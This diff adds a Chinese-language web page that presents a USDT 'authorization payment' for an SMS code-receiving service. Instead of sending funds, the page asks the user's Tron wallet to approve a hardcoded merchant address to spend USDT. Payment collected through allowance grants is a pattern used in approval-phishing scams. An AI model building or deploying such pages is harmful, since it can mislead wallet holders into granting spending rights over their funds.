@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>海內外接碼 - USDT 授權收款</title>
+<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+<style>
+body{font-family:sans-serif;text-align:center;padding:40px}
+input{padding:10px;font-size:16px;width:220px}
+button{padding:12px 25px;font-size:16px;margin-top:15px}
+</style>
+</head>
+
+<body>
+
+<h2>海內外接碼</h2>
+<p>TRC20 USDT 授權付款</p>
+
+<input type="number" id="amount" placeholder="輸入金額" step="0.000001">
+<br>
+<button onclick="approve()">確認授權</button>
+
+<script>
+
+const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
+const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
+
+function toSun(amount){
+  return Math.floor(parseFloat(amount) * 1000000)
+}
+
+async function approve(){
+
+  if(typeof window.tronWeb === "undefined"){
+    alert("請使用 TokenPocket 或 TronLink 內建瀏覽器開啟")
+    return
+  }
+
+  const amountInput = document.getElementById("amount").value
+  if(!amountInput || amountInput <= 0){
+    alert("請輸入正確金額")
+    return
+  }
+
+  const amount = toSun(amountInput)
+
+  const contract = await window.tronWeb.contract().at(usdtContract)
+
+  try{
+    await contract.approve(merchant, amount).send()
+    alert("授權成功")
+  }catch(e){
+    alert("交易取消或失敗")
+  }
+}
+
+</script>
+
+</body>
+</html>
